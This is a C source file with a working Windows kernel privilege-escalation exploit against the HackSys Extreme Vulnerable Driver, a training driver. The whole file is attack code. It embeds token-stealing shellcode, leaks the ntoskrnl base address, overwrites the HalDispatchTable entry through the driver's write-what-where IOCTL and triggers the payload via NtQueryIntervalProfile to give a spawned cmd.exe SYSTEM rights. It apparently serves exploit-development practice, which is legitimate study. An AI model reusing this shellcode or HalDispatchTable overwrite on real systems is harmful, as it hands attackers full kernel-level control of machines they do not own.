#include <Windows.h>
#include <stdio.h>
#include <psapi.h>

// PIPE FOR WINDBG: \\.\pipe\com1

// Help provided by rootkits.xyz (https://rootkits.xyz/blog/2017/09/kernel-write-what-where/)
// Beautiful writeup on what a Write-What-Where is. My ideas of this exploit were very foggy, but this seems nearly as easy
// as a vanilla stack buffer overflow!

// Shellcode provided by xpnsec! His blog can be found here: https://blog.xpnsec.com/hevd-null-pointer/
// Replace shellcode+27 with the process ID (PID)
BYTE shellcode[95] = {
	0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25,
	0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x10, 0x02, 0x00,
	0x00, 0x81, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x41, 0x41, 0x41,
	0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00,
	0x48, 0x2d, 0x88, 0x01, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89,
	0xc3, 0x83, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x04, 0x74, 0x0f,
	0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2d, 0x88,
	0x01, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x08, 0x02,
	0x00, 0x00, 0x48, 0x89, 0x8b, 0x08, 0x02, 0x00, 0x00, 0x5f,
	0x5e, 0x59, 0x5b, 0x58, 0xc3
};

char unused = 0;

typedef NTSTATUS(NTAPI* NtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval
	);

struct WRITE_WHAT_WHERE {
	LPVOID what;
	LPVOID where;
};

// Created by Uncodable on 5/2/2021.
int main(int argc, char** argv)
{
	printf("Write-What-Where HackSys Extreme Vulnerable Driver | Uncodable\n" "Let's exploit!\n");

	DWORD oldProtection = 0;
	VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtection);
	printf("[*] Shellcode address: 0x%p\n", &shellcode);

	unsigned long long addresses[10000] = { 0 };
	DWORD bytesReturned = 0;
	EnumDeviceDrivers(&addresses, 10000, &bytesReturned);
	int addressCount = bytesReturned / 8;
	printf("[*] Number of device drivers: %d\n", addressCount);

	unsigned long long ntosknrlAddress = 0;
	char deviceName[1024] = { 0 };
	char lookingFor[13] = "ntoskrnl.exe";
	for (int i = 0; i < 10000; i++)
	{
		if (addresses[i] != 0) {
			GetDeviceDriverBaseNameA(addresses[i], &deviceName, sizeof(deviceName));
			if (!strcmp(deviceName, lookingFor))
			{
				printf("[+] Found ntoskrnl.exe base address! Address: 0x%p\n", addresses[i]);
				ntosknrlAddress = addresses[i];
			}
		}
	}
	if (!ntosknrlAddress)
	{
		printf("[-] Failed to find the ntoskrnl.exe base address.");
		unused = getchar();
		return 0;
	}

	HANDLE hNTHandle = LoadLibraryExA("ntoskrnl.exe", NULL, 0x00000001);
	if (hNTHandle == (HANDLE)-1)
	{
		printf("[-] Failed to obtain a handle to the NT kernel.");
		unused = getchar();
		return 0;
	}
	printf("[+] Obtained handle to the NT kernel! Handle value: 0x%p\n", hNTHandle);

	unsigned long long halAddress = GetProcAddress(hNTHandle, "HalDispatchTable");
	halAddress -= (unsigned long long)hNTHandle;
	halAddress += ntosknrlAddress + 0x4;
	printf("[+] Found HalDispatchTable address! Address: 0x%p\n", halAddress);

	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == (HANDLE)-1)
	{
		printf("[-] Failed to obtain a handle to the HackSys Extreme Vulnerable Driver.");
		unused = getchar();
		return 0;
	}
	printf("[+] Obtained handle! Handle value: 0x%p\n", hDriver);

	PROCESS_INFORMATION processInformation;
	STARTUPINFO startupInfo;
	ZeroMemory(&processInformation, sizeof(processInformation));
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation))
	{
		printf("\n[-] Failed to spawn a shell.");
		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);
		unused = getchar();
		return 0;
	}
	*(DWORD*)((char*)shellcode + 27) = processInformation.dwProcessId;

	// wtf do I do here?
	struct WRITE_WHAT_WHERE writeWhatWhere = { (unsigned long*)shellcode, halAddress };
	printf("DEBUG: shellcode address: 0x%p, hal address: 0x%p\n", &shellcode, halAddress);
	DWORD oldProtection2 = 0;
	VirtualProtect(&writeWhatWhere, sizeof(writeWhatWhere), PAGE_EXECUTE_READWRITE, &oldProtection2);
	DWORD bytesReturned2 = 0;
	DWORD outBuffer[1024] = { 0 };
	DeviceIoControl(hDriver, 0x22200B, &writeWhatWhere, 16, &outBuffer, sizeof(outBuffer), &bytesReturned2, NULL);
	printf("[*] Sent IO control code.\n");

	printf("[+] Lastly, we will now call NtQueryIntervalProfile() to trigger our payload.\n");
	HANDLE hNtdll = GetModuleHandleW(L"ntdll.dll");
	NtQueryIntervalProfile _NtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	ULONG value = 0;
	_NtQueryIntervalProfile(0x2, &value);

	printf("[*] Exploit finished.");
	unused = getchar();
	return 1;
}
